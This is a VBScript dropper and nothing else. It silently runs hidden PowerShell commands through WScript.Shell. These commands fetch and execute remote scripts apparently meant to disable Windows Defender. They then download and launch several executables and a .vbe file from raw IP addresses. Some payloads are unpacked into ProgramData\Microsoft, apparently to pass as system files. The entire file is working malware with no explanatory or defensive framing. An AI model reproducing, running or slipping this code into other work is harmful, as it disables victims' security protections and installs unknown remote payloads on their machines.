Dim cmd1, cmd2, cmd3, cmd4, cmd5, cmd6, cmd7, cmd8, cmd9, cmd10, cmd11, cmd12, cmd13, cmd14, cmd15, cmd16

cmd1 = "powershell iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/main/DisableWindowsDefender.ps1').Content"
cmd2 = "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Raroford32/DisableWindowsDefender/main/w2022')"
cmd3 = "powershell Invoke-WebRequest -Uri http://140.82.32.9/abda.exe -OutFile .\abda.exe; .\abda.exe"
cmd4 = "powershell Invoke-WebRequest -Uri http://45.32.125.172/svc.exe -OutFile .\svc.exe; .\svc.exe"
cmd5 = "powershell Invoke-WebRequest -Uri http://45.32.125.172/Visors.exe -OutFile .\Visors.exe; .\Visors.exe"
cmd6 = "powershell Invoke-WebRequest -Uri http://45.32.125.172/last.vbe -OutFile .\last.vbe; .\last.vbe"
cmd7 = "Invoke-WebRequest -Uri 'http://37.27.22.144/sorolo.zip' -OutFile '$env:ProgramData\Microsoft\sorolo.zip'; Expand-Archive -Path '$env:ProgramData\Microsoft\sorolo.zip' -DestinationPath '$env:ProgramData\Microsoft';"
cmd8 = "Start-Process '$env:ProgramData\Microsoft\sorolo.exe'"
cmd9 = "cd C:\ProgramData\Microsoft"
cmd10 = ".\sorolo.exe"
cmd11 = "Invoke-WebRequest -Uri 'http://37.27.22.144/sortolsh.zip' -OutFile '$env:ProgramData\Microsoft\sortolsh.zip'; Expand-Archive -Path '$env:ProgramData\Microsoft\sortolsh.zip' -DestinationPath '$env:ProgramData\Microsoft';"
cmd12 = "Start-Process '$env:ProgramData\Microsoft\sortolsh.exe'"
cmd13 = "cd C:\ProgramData\Microsoft"
cmd14 = ".\sortolsh.exe"
cmd15 = "exit"

Dim wshShell
Set wshShell = CreateObject("WScript.Shell")

wshShell.Run "cmd.exe /c " & Chr(34) & cmd1 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd2 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd3 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd4 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd5 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd6 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd7 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd8 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd9 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd10 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd11 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd12 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd13 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd14 & Chr(34), 0, True
wshShell.Run "cmd.exe /c " & Chr(34) & cmd15 & Chr(34), 0, True

Set wshShell = Nothing
